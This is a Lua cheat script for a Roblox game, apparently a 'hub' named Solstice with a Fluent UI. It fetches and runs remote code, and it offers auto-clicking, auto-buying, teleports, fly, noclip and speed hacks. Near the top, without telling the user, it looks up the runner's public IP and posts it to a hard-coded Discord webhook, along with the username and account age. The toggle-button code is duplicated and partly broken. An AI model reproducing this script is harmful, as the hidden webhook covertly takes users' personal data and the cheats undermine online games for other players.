local ProtectionConfig = {
    -- 🔴 CRITICAL: This MUST exactly match the 'Secret' value in your Key System's Config!
    -- If your Key System has: Secret = "Test"
    -- Then this must also be: SecretKey = "Test"
    SecretKey = "123344",
    
    -- The name of your Hub (shown in the kick message if they try to bypass)
    HubName = "Solstice"
}

-- Anti-Bypass Logic: Checks if the Key System successfully set the global variable
if not _G[ProtectionConfig.SecretKey] then
    local playerl = game:GetService("Players").LocalPlayer
    if playerl then
        playerl:Kick("Son just run the main script " .. ProtectionConfig.HubName)
    end
    return -- Stops the rest of the script from loading!
end

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Solstice",
    SubTitle = "by Vaynx",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WebhookURL = "https://discord.com/api/webhooks/1556211722769932339/oqazbKhBkFSKY6Mmv7X5LxbzzOwzZbAgyI7O-M5Xal_8c-xr6QpHoil9j9jIhwcUEwWJ"

local function getPublicIP()
    local success, response = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if success and response then
        return response
    end
    return "Unavailable"
end

local function sendWebhook()
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc then 
        warn("No supported HTTP request function found in your executor.")
        return 
    end

    local userIP = getPublicIP()

    local payload = HttpService:JSONEncode({
        embeds = {{
            title = "Script Executed",
            color = 3447003, -- Blue
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
                { name = "IP Address", value = userIP, inline = true },
                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
                { name = "Job ID", value = game.JobId ~= "" and game.JobId or "Singleplayer / Studio", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    })

    requestFunc({
        Url = WebhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = payload
    })
end

sendWebhook()

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "" }),
    Movement = Window:AddTab({ Title = "Movement", Icon = "" }),
    Utilities = Window:AddTab({ Title = "Utilities", Icon = "" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "" })
}

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- 1. Create ScreenGui
local ToggleGui = Instance.new("ScreenGui")
ToggleGui.Name = "FluentToggleGui"
ToggleGui.ResetOnSpawn = false

-- Use executor interface protection if available, fallback to PlayerGui
if gethui then
    ToggleGui.Parent = gethui()
elseif syn and syn.protect_gui then
    syn.protect_gui(ToggleGui)
    ToggleGui.Parent = CoreGui
else
    ToggleGui.Parent = CoreGui or Players.LocalPlayer:WaitForChild("PlayerGui")
end

-- 2. Create Floating Button
local ToggleButton = Instance.new("ImageButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Size = UDim2.fromOffset(50, 50)
ToggleButton.Position = UDim2.new(0.85, 0, 0.2, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ToggleButton.BorderSizePixel = 0
ToggleButton.AutoButtonColor = false
ToggleButton.Image = "rbxassetid://6031075931" -- Replace with your icon ID if needed
ToggleButton.ImageColor3 = Color3.fromRGB(220, 220, 220)
ToggleButton.Parent = ToggleGui

-- Make it circular
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(1, 0)
UICorner.Parent = ToggleButton

-- Add outline/border
local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(45, 45, 45)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = ToggleButton

-- 3. Dragging Support (Mouse & Touch)
local dragging, dragInput, dragStart, startPos

local function updatePos(input)
    local delta = input.Position - dragStart
    ToggleButton.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X, 
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = ToggleButton.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

-- ------------------ FLOATING TOGGLE BUTTON ------------------
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

-- Create ScreenGui
local ToggleGui = Instance.new("ScreenGui")
ToggleGui.Name = "FluentToggleGui"
ToggleGui.ResetOnSpawn = false

-- Use CoreGui if available (executors), fallback to PlayerGui
if syn or gethui or protectgui then
    if gethui then
        ToggleGui.Parent = gethui()
    else
        ToggleGui.Parent = CoreGui
    end
else
    ToggleGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
end


-- Circle Corner
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(1, 0)
UICorner.Parent = ToggleButton

-- UI Stroke / Border
local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(45, 45, 45)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = ToggleButton

-- Make the button draggable across screen
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    ToggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = ToggleButton.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Toggle Fluent GUI Minimize State on Click
ToggleButton.MouseButton1Click:Connect(function()
    -- Click scale animation
    TweenService:Create(ToggleButton, TweenInfo.new(0.1), { Size = UDim2.fromOffset(45, 45) }):Play()
    task.wait(0.1)
    TweenService:Create(ToggleButton, TweenInfo.new(0.1), { Size = UDim2.fromOffset(50, 50) }):Play()

    -- Minimizes or opens the window
    if Window then
        Window:Minimize()
    end
end)

-- Global Stage Tracking Variables
local currentStage = 1
local currentWall = 1

-- Teleport Logic Helpers
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local autoTpThread = nil
local autoAuraThread = nil

-- Completion CFrame (-874, -0.25, -190, 1, 0, 0, 0, 1, 0, 0, 0, 1)
local COMPLETION_CFRAME = CFrame.new(-874, -0.25, -190, 1, 0, 0, 0, 1, 0, 0, 0, 1)

-- Helper function to parse a string into a CFrame object
local function parseCFrame(str)
    if not str or type(str) ~= "string" then return nil end
    
    local coords = {}
    for num in string.gmatch(str, "[-+]?%d*%.?%d+") do
        table.insert(coords, tonumber(num))
    end

    if #coords == 12 then
        return CFrame.new(table.unpack(coords))
    elseif #coords >= 3 then
        return CFrame.new(coords[1], coords[2], coords[3])
    end

    return nil
end

-- Teleport player to a specific CFrame
local function tpToCFrame(targetCFrame)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") and targetCFrame then
        character:PivotTo(targetCFrame)
        return true
    end
    return false
end

-- Aura Wins Costs Table
local auraCosts = {
    [1] = 0,
    [2] = 5,
    [3] = 15,
    [4] = 30,
    [5] = 75,
    [6] = 150,
    [7] = 300,
    [8] = 600,
    [9] = 1200,
    [10] = 2500,
    [11] = 5000,
    [12] = 10000,
    [13] = 25000,
    [14] = 50000,
    [15] = 100000,
    [16] = 250000,
    [17] = 500000,
    [18] = 1000000,
    [19] = 2500000,
    [20] = 5000000,
    [21] = 10000000,
    [22] = 25000000,
    [23] = 50000000,
    [24] = 100000000,
    [25] = 250000000,
    [26] = 500000000,
    [27] = 1000000000,
    [28] = 2500000000,
    [29] = 5000000000,
    [30] = 10000000000
}

-- Check if player already owns a specific aura
local function isAuraOwned(auraCost)
    local ownedFolder = LocalPlayer:FindFirstChild("OwnedAuras")
    if ownedFolder then
        for _, item in ipairs(ownedFolder:GetChildren()) do
            if item.Name == tostring(auraCost) or item.Value == auraCost then
                return true
            end
        end
    end
    return false
end

-- Get player's current Wins count from NumericStats
local function getPlayerWins()
    local numericStats = LocalPlayer:FindFirstChild("NumericStats")
    if numericStats then
        local winsValue = numericStats:FindFirstChild("Wins")
        if winsValue then
            return winsValue.Value
        end
    end
    
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local winsValue = leaderstats:FindFirstChild("Wins")
        if winsValue then
            return winsValue.Value
        end
    end

    return 0
end

-- Find the highest affordable unowned aura cost based on current wins
local function getHighestAffordableUnownedAuraCost()
    local currentWins = getPlayerWins()

    for index = 30, 1, -1 do
        local cost = auraCosts[index]
        if cost and currentWins >= cost then
            if not isAuraOwned(cost) then
                return cost
            end
        end
    end

    return nil
end

-- ------------------ MAIN TAB ------------------

-- 1. Spam Punch Toggle
local PunchToggle = Tabs.Main:AddToggle("SpamPunchToggle", {
    Title = "Auto Click", 
    Description = "Auto Clicker/Auto Train, can also use with Auto Stage",
    Default = false
})

PunchToggle:OnChanged(function(Value)
    if Value then
        task.spawn(function()
            while PunchToggle.Value do
                for i = 1, 5 do
                    game:GetService("ReplicatedStorage").PunchEscapeRemotes.PunchRequest:FireServer(Vector3.new(-852.0292358398438, 14.618500709533691, -166.42999267578125))
                end
                task.wait()
            end
        end)
    end
end)

-- 2. Auto Rebirth Button
Tabs.Main:AddButton({
    Title = "Auto Rebirth",
    Description = "Enables Auto Rebirth",
    Callback = function()
        game:GetService("ReplicatedStorage").PunchEscapeRemotes.SettingsPreferenceRequest:FireServer("AutoRebirth", true)
    end
})

-- 3. Auto Buy Highest Unowned Aura Toggle
local AutoAuraToggle = Tabs.Main:AddToggle("AutoAuraToggle", {
    Title = "Auto Aura", 
    Description = "Auto buys the highest unowned aura",
    Default = false
})

AutoAuraToggle:OnChanged(function(Value)
    if Value then
        autoAuraThread = task.spawn(function()
            while AutoAuraToggle.Value do
                local targetCost = getHighestAffordableUnownedAuraCost()
                if targetCost then
                    game:GetService("ReplicatedStorage").PunchEscapeRemotes.PurchaseRequest:FireServer("AuraWins", targetCost)
                    task.wait(2)
                else
                    task.wait(1)
                end
            end
        end)
    else
        if autoAuraThread then
            task.cancel(autoAuraThread)
            autoAuraThread = nil
        end
    end
end)

-- 4. Custom CFrame Input Teleport
local targetCFrameInput = ""

local CFrameInput = Tabs.Movement:AddInput("CFrameInput", {
    Title = "Teleport CFrame / Position",
    Description = "Paste X, Y, Z or 12-number CFrame",
    Default = "-874, -0.25, -190",
    Placeholder = "-874, -0.25, -190",
    Numeric = false,
    Finished = true,
    Callback = function(Value)
        targetCFrameInput = Value
        local parsed = parseCFrame(Value)
        if parsed then
            local success = tpToCFrame(parsed)
            if success then
                Fluent:Notify({ Title = "Teleported", Content = "Successfully teleported to input CFrame!", Duration = 2 })
            else
                Fluent:Notify({ Title = "Error", Content = "Character not found!", Duration = 2 })
            end
        else
            Fluent:Notify({ Title = "Invalid Input", Content = "Please enter valid coordinates", Duration = 3 })
        end
    end
})

-- Button to trigger CFrame teleport manually from current input text
Tabs.Movement:AddButton({
    Title = "Teleport to Input CFrame",
    Description = "Teleports to the coordinates typed above",
    Callback = function()
        local parsed = parseCFrame(CFrameInput.Value or targetCFrameInput)
        if parsed then
            local success = tpToCFrame(parsed)
            if success then
                Fluent:Notify({ Title = "Teleported", Content = "Successfully teleported!", Duration = 2 })
            else
                Fluent:Notify({ Title = "Error", Content = "Character not found!", Duration = 2 })
            end
        else
            Fluent:Notify({ Title = "Invalid Input", Content = "Please enter valid coordinates", Duration = 3 })
        end
    end
})

-- Helper function to search for a wall in workspace
local function findWall(stage, wall)
    local targetName = "Stage" .. stage .. "Wall" .. wall
    local found = workspace:FindFirstChild(targetName, true)
    if found then return found end

    local stagesFolder = workspace:FindFirstChild("Stages") or workspace:FindFirstChild("Map")
    if stagesFolder then
        local stageObj = stagesFolder:FindFirstChild("Stage" .. stage) or stagesFolder:FindFirstChild(tostring(stage))
        if stageObj then
            return stageObj:FindFirstChild("Wall" .. wall) or stageObj:FindFirstChild("Wall " .. wall)
        end
    end

    return nil
end

-- Comprehensive check to determine if a wall is destroyed/0 HP
local function isWallBroken(wallObj)
    if not wallObj or not wallObj:IsDescendantOf(workspace) then
        return true
    end

    if wallObj:IsA("BasePart") then
        if wallObj.Transparency >= 0.8 or not wallObj.CanCollide then
            return true
        end
    end

    for _, child in ipairs(wallObj:GetChildren()) do
        if (child.Name == "Health" or child.Name == "HP" or child.Name == "Hp") and child:IsA("ValueBase") then
            if child.Value <= 0 then
                return true
            end
        end
    end

    local attrHp = wallObj:GetAttribute("Health") or wallObj:GetAttribute("HP") or wallObj:GetAttribute("Hp")
    if attrHp and attrHp <= 0 then
        return true
    end

    if wallObj:IsA("Model") then
        local primaryPart = wallObj.PrimaryPart or wallObj:FindFirstChildWhichIsA("BasePart")
        if primaryPart and (primaryPart.Transparency >= 0.8 or not primaryPart.CanCollide) then
            return true
        end
    end

    return false
end

-- Scans for the FIRST wall that has health > 0 HP
local function getFirstAliveWall()
    for stage = 1, 100 do
        local stageHasWalls = false
        for wall = 1, 15 do
            local wallObj = findWall(stage, wall)
            if wallObj then
                stageHasWalls = true
                if not isWallBroken(wallObj) then
                    return stage, wall, wallObj
                end
            end
        end
        if not stageHasWalls and stage > 1 then
            break
        end
    end
    return nil, nil, nil
end

-- Teleport to wall stand position
local function tpToWall(wallObj)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") and wallObj then
        local wallCFrame = wallObj:IsA("Model") and wallObj:GetPivot() or wallObj.CFrame
        local wallPos = wallCFrame.Position
        
        local standPos = wallPos + (wallCFrame.RightVector * 7) + Vector3.new(0, 2, 0)
        
        character:PivotTo(CFrame.lookAt(standPos, Vector3.new(wallPos.X, standPos.Y, wallPos.Z)))
        return true
    end
    return false
end

-- Teleport to completion coordinates
local function tpToCompletion()
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:PivotTo(COMPLETION_CFRAME)
    end
end

-- Function to find whichever wall your character is physically nearest to right now
local function getNearestWallInMap()
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return nil, nil, nil end

    local hrp = character.HumanoidRootPart
    local closestWall = nil
    local closestDist = math.huge
    local foundStage, foundWall = nil, nil

    for _, child in ipairs(workspace:GetDescendants()) do
        if string.match(child.Name, "^Stage%d+Wall%d+$") then
            local s, w = string.match(child.Name, "Stage(%d+)Wall(%d+)")
            s, w = tonumber(s), tonumber(w)
            
            if w then
                local pos = child:IsA("Model") and child:GetPivot().Position or child.Position
                local dist = (pos - hrp.Position).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closestWall = child
                    foundStage = s
                    foundWall = w
                end
            end
        end
    end

    return foundStage, foundWall, closestWall
end

-- 5. Button: Teleport To Nearest Physical Wall
Tabs.Main:AddButton({
    Title = "Re-Teleport to Current Wall",
    Description = "Teleports you to the exact wall you are standing next to right now",
    Callback = function()
        local s, w, nearestWall = getNearestWallInMap()
        if nearestWall then
            currentStage = s
            currentWall = w
            tpToWall(nearestWall)
            Fluent:Notify({ Title = "Teleported", Content = "Teleported to Stage " .. s .. " Wall " .. w, Duration = 2 })
        else
            Fluent:Notify({ Title = "Error", Content = "No nearby wall found", Duration = 2 })
        end
    end
})

-- 6. Automatic Stage & Wall Progression Toggle
local WallTpToggle = Tabs.Main:AddToggle("AutoTpWallToggle", {
    Title = "Auto Stage & Wall Progression", 
    Description = "Advances through walls",
    Default = false
})

WallTpToggle:OnChanged(function(Value)
    if Value then
        autoTpThread = task.spawn(function()
            local s, w, aliveWall = getFirstAliveWall()
            if aliveWall then
                currentStage = s
                currentWall = w
                tpToWall(aliveWall)
            else
                tpToCompletion()
            end

            while WallTpToggle.Value do
                local activeWall = findWall(currentStage, currentWall)

                if isWallBroken(activeWall) then
                    local nextStage, nextWall, nextAliveWall = getFirstAliveWall()
                    if nextAliveWall then
                        currentStage = nextStage
                        currentWall = nextWall
                        tpToWall(nextAliveWall)
                    else
                        tpToCompletion()
                    end

                    task.wait(0.5)
                end

                task.wait(0.2)
            end
        end)
    else
        if autoTpThread then
            task.cancel(autoTpThread)
            autoTpThread = nil
        end
    end
end)

-- ------------------ MOVEMENT TAB ------------------

-- 1. WalkSpeed Toggle & Slider
local WalkSpeedToggle = Tabs.Movement:AddToggle("WalkSpeedToggle", {
    Title = "Enable Custom WalkSpeed",
    Description = "Toggle custom movement speed modification",
    Default = false
})

local WalkSpeedSlider = Tabs.Movement:AddSlider("WalkSpeedSlider", {
    Title = "WalkSpeed",
    Description = "Customize your movement speed",
    Default = 16,
    Min = 16,
    Max = 500,
    Rounding = 0,
    Callback = function(Value)
        if WalkSpeedToggle.Value then
            local character = LocalPlayer.Character
            if character then
                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = Value
                end
            end
        end
    end
})

WalkSpeedToggle:OnChanged(function(Value)
    local character = LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = Value and WalkSpeedSlider.Value or 16
        end
    end
end)

-- Re-apply WalkSpeed on respawn
LocalPlayer.CharacterAdded:Connect(function(char)
    local humanoid = char:WaitForChild("Humanoid", 5)
    if humanoid and WalkSpeedToggle.Value then
        humanoid.WalkSpeed = WalkSpeedSlider.Value
    end
end)

-- 2. Fly Toggle & Fly Speed Slider
local flySpeed = 50

local FlyToggle = Tabs.Movement:AddToggle("FlyToggle", {
    Title = "Fly",
    Description = "Enable flight movement (Use WASD / Space / Shift)",
    Default = false
})

local FlySpeedSlider = Tabs.Movement:AddSlider("FlySpeedSlider", {
    Title = "Fly Speed",
    Description = "Adjust your flying speed",
    Default = 50,
    Min = 10,
    Max = 500,
    Rounding = 0,
    Callback = function(Value)
        flySpeed = Value
    end
})

local flyConn = nil

FlyToggle:OnChanged(function(Value)
    local character = LocalPlayer.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")

    if Value then
        if not hrp then return end
        
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "FlyVelocity"
        bodyVelocity.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        bodyVelocity.Velocity = Vector3.zero
        bodyVelocity.Parent = hrp

        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.Name = "FlyGyro"
        bodyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
        bodyGyro.CFrame = hrp.CFrame
        bodyGyro.Parent = hrp

        if humanoid then humanoid.PlatformStand = true end

        flyConn = RunService.RenderStepped:Connect(function()
            local camera = workspace.CurrentCamera
            local moveVector = Vector3.zero

            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                moveVector = moveVector + camera.CFrame.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                moveVector = moveVector - camera.CFrame.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                moveVector = moveVector - camera.CFrame.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                moveVector = moveVector + camera.CFrame.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                moveVector = moveVector + Vector3.new(0, 1, 0)
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                moveVector = moveVector - Vector3.new(0, 1, 0)
            end

            bodyVelocity.Velocity = moveVector * flySpeed
            bodyGyro.CFrame = camera.CFrame
        end)
    else
        if flyConn then
            flyConn:Disconnect()
            flyConn = nil
        end
        if hrp then
            local bv = hrp:FindFirstChild("FlyVelocity")
            local bg = hrp:FindFirstChild("FlyGyro")
            if bv then bv:Destroy() end
            if bg then bg:Destroy() end
        end
        if humanoid then humanoid.PlatformStand = false end
    end
end)

-- 3. Noclip Toggle
local NoclipToggle = Tabs.Movement:AddToggle("NoclipToggle", {
    Title = "Noclip",
    Description = "Walk through walls and obstacles",
    Default = false
})

local NoclipConn = nil
local ClipState = true

local function startNoclip()
    ClipState = false
    local function Nocl()
        if ClipState == false and LocalPlayer.Character ~= nil then
            for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") and v.CanCollide then
                    v.CanCollide = false
                end
            end
        end
        task.wait(0.21)
    end
    NoclipConn = RunService.Stepped:Connect(Nocl)
end

local function stopClip()
    if NoclipConn then NoclipConn:Disconnect() end
    ClipState = true
end

NoclipToggle:OnChanged(function(Value)
    if Value then
        startNoclip()
    else
        stopClip()
    end
end)

-- 4. Infinite Jump Toggle
local InfiniteJumpToggle = Tabs.Movement:AddToggle("InfiniteJumpToggle", {
    Title = "Infinite Jump",
    Description = "Jump repeatedly in mid-air without normal limits",
    Default = false
})

local infJumpConn = nil
InfiniteJumpToggle:OnChanged(function(Value)
    if Value then
        infJumpConn = UserInputService.JumpRequest:Connect(function()
            local character = LocalPlayer.Character
            if character then
                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    else
        if infJumpConn then
            infJumpConn:Disconnect()
            infJumpConn = nil
        end
    end
end)

-- ------------------ UTILITIES TAB ------------------

-- 1. Auto Reconnect on Kick
local AutoReconnectToggle = Tabs.Utilities:AddToggle("AutoReconnect", {
    Title = "Auto Reconnect",
    Description = "Automatically reconnects to the game after being kicked or disconnected",
    Default = false
})

local reconnectConn = nil
AutoReconnectToggle:OnChanged(function(Value)
    if Value then
        reconnectConn = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
            if child.Name == "ErrorPrompt" then
                task.wait(2)
                game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
            end
        end)
    else
        if reconnectConn then
            reconnectConn:Disconnect()
            reconnectConn = nil
        end
    end
end)

-- 2. FPS Boost
Tabs.Utilities:AddButton({
    Title = "FPS Boost",
    Description = "Lowers graphic textures and effects to optimize game performance",
    Callback = function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 0
        end

        game:GetService("Lighting").GlobalShadows = false
        game:GetService("Lighting").FogEnd = 9e9

        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Material = Enum.Material.SmoothPlastic
                v.Reflectance = 0
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v:Destroy()
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
                v.Enabled = false
            end
        end
        Fluent:Notify({ Title = "FPS Boost", Content = "Performance settings applied successfully!", Duration = 2 })
    end
})

-- 3. Anti-AFK
local AntiAFKToggle = Tabs.Utilities:AddToggle("AntiAFK", {
    Title = "Anti-AFK",
    Description = "Helps prevent 20-minute inactivity kicks",
    Default = false
})

local antiAfkConn = nil
AntiAFKToggle:OnChanged(function(Value)
    if Value then
        antiAfkConn = LocalPlayer.Idled:Connect(function()
            local virtualUser = game:GetService("VirtualUser")
            virtualUser:CaptureController()
            virtualUser:ClickButton2(Vector2.new())
        end)
    else
        if antiAfkConn then
            antiAfkConn:Disconnect()
            antiAfkConn = nil
        end
    end
end)

-- 4. Disable 3D Rendering
local DisableRenderingToggle = Tabs.Utilities:AddToggle("Disable3DRendering", {
    Title = "Disable 3D Rendering",
    Description = "Disables 3D world rendering to significantly reduce CPU/GPU usage",
    Default = false
})

DisableRenderingToggle:OnChanged(function(Value)
    RunService:Set3dRenderingEnabled(not Value)
end)

-- ------------------ SETTINGS TAB ------------------

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("FluentScript")
SaveManager:SetFolder("FluentScript/configs")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)
SaveManager:LoadAutoloadConfig()
